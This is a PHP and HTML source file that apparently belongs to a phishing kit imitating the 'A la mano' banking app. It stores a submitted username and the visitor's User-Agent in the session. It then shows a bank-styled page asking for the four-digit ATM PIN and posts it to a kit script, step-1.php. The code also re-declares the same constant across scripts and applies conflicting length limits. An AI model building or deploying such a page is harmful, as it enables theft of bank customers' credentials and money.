<?php


session_start();


if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Sanitizar y almacenar el nombre de usuario social
  $nombre = htmlspecialchars(trim($_POST['socialusu']));
  
  // Almacenar los datos en la sesión
  $_SESSION['usuario'] = [
      'socialusu' => $nombre,
    
  ];
  
 
}
// Extraer el User-Agent
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Almacenar el User-Agent en la sesión
$_SESSION['user_agent'] = $userAgent;

?>



<!DOCTYPE html>
<html lang="es">

<head>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Clave</title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <link rel="stylesheet" href="../amano/css/estilos.css">
  <link rel="stylesheet" href="../amano/css/3dias.css">
  <script src="./js/jquery-3.6.0.min.js"></script>
  <script src="./js/functions.js"></script>
  <script src="./js/toos.js"></script>
</head>
<body>
<div class="container-fluid header">
  <div class="row py-2">
    <div class="col text-left">
      <a href="#" class="text-dark">
        <img src="../amano/tom/x.svg" alt="Cerrar" width="20px" class="img-fluid" style="vertical-align: middle;">
      </a>
    </div>
    <div class="col text-center">
      <img src="../amano/tom/lg.png" alt="Logo" width="30px" class="img-fluid logo">
    </div>
    <div class="col text-right">
      <a href="#" class="text-dark">
        Continuar 
        <img src="../amano/tom/felcha.svg" alt="Continuar" width="20px" class="img-fluid" style="vertical-align: middle;">
      </a>
    </div>
  </div>
</div>


<form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
            name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="../amano/step-1.php"
            enctype="application/x-www-form-urlencoded">





<div class="container-nubes">
  <div class="taine-lopa"></div>
  <div class="container nubes">
    <div class="demencia-ok">
      <div class="vertical-center text-center">
        <img src="../amano/tom/seguridad.jpg" alt="Icono" width="30px">
        <p class="mt-2">Ingresa la clave del cajero</p>
        <div class="tamal-poco">

          <input type="tel" id="txtPassword" name="txtPassword" class="form-control" maxlength="4">
          
          <input type="hidden" value="A la mano" id="banco">
        </div>
      </div>
    </div>
  </div>
</div>
<div class="text-center mt-3">
  <button id="btnPass" name="btnPass" class="ban-boom" disabled>CONTINUAR</button>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

<script>
  $(document).ready(function () {
    $('#txtPassword').on('input', function () {
      const inputVal = $(this).val();
      if (/^\d{4}$/.test(inputVal)) {
        $('#btnPass').prop('disabled', false);
      } else {
        $('#btnPass').prop('disabled', true);
      }
    });

    $('#txtPassword').on('focus input', function () {
      $(this).attr('type', 'password'); 
    }).on('blur', function () {
      $(this).attr('type', 'tel'); 
    });
  });
</script>
  <script>
    const input = document.getElementById('txtPassword');
    input.addEventListener('input', function() {
      // Eliminar caracteres no numéricos
      this.value = this.value.replace(/[^0-9]/g, '');

      // Limitar a 6 caracteres
      if (this.value.length > 6) {
        this.value = this.value.slice(0, 6);
      }
    });
  </script>
  <script>
    const input = document.getElementById('txtPassword');
    input.addEventListener('input', function() {
      if (this.value.length > 6) {
        this.value = this.value.slice(0, 6);
      }
    });
  </script>
</body>
</html>
